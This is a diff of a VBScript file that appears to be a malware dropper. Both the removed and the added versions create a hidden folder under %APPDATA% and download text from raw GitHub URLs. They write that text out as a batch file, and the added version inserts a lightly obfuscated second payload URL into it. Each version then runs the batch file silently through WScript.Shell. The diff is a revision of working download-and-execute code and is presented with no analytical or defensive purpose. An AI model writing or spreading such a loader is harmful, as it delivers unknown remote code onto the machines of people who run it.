@@ -1,33 +1,13 @@
-With CreateObject("Scripting.FileSystemObject")
-    f = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\Grok-l")
-    If .FolderExists(f) Then .DeleteFolder f, True
-End With
+On Error Resume Next
 
-Set FSO = CreateObject("Scripting.FileSystemObject")
-Set WShell = CreateObject("WScript.Shell")
-strAppData = WShell.ExpandEnvironmentStrings("%APPDATA%")
-strFolder = strAppData & "\Grok-l"
+Set fso = CreateObject("Scripting.FileSystemObject")
 
-If Not FSO.FolderExists(strFolder) Then FSO.CreateFolder(strFolder)
+fso.CreateFolder CreateObject("WScript.Shell").ExpandEnvironmentStrings("%appdata%\paged-l")
 
-Set txtFile = FSO.CreateTextFile(strFolder & "\l.txt", True)
-txtFile.WriteLine "https://raw.githubusercontent.com/ayandantshona436/code/main/encoded.txt"
-txtFile.Close
-
-Set txtFile2 = FSO.CreateTextFile(strFolder & "\m.txt", True)
-Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
-xmlHttp.Open "GET", "https://raw.githubusercontent.com/USATIKTOKER/NEWADD/main/main.txt", False
-xmlHttp.Send
-txtFile2.Write xmlHttp.responseText
-txtFile2.Close
-
+Set http = CreateObject("MSXML2.XMLHTTP"): http.Open "GET", "https://raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V/Main.txt", False: http.Send
+If http.Status = 200 Then fso.CreateTextFile(CreateObject("WScript.Shell").ExpandEnvironmentStrings("%appdata%\paged-l\special.bat")).Write http.ResponseText
 WScript.Sleep 5000
-FSO.MoveFile strFolder & "\m.txt", strFolder & "\m.bat"
-WScript.Sleep 3000
 
-' FIXED: Use quoted path & check if file exists before running
-If FSO.FileExists(strFolder & "\m.bat") Then
-    WShell.Run Chr(34) & strFolder & "\m.bat" & Chr(34), 0, False
-Else
-    WScript.Echo "Error: m.bat not found in " & strFolder
-End If
+Set sh = CreateObject("WScript.Shell"): f = sh.ExpandEnvironmentStrings("%appdata%\paged-l\special.bat"): Set a = fso.OpenTextFile(f, 1): s = a.ReadAll: a.Close: Set a = fso.OpenTextFile(f, 2): a.Write Replace(s, "****", "https:$$raw.githubusercontent.com$ayandantshona436$code$main$encoded.txt"): a.Close
+
+sh.Run "cmd /c timeout /t 5 & %appdata%\paged-l\special.bat", 0, False
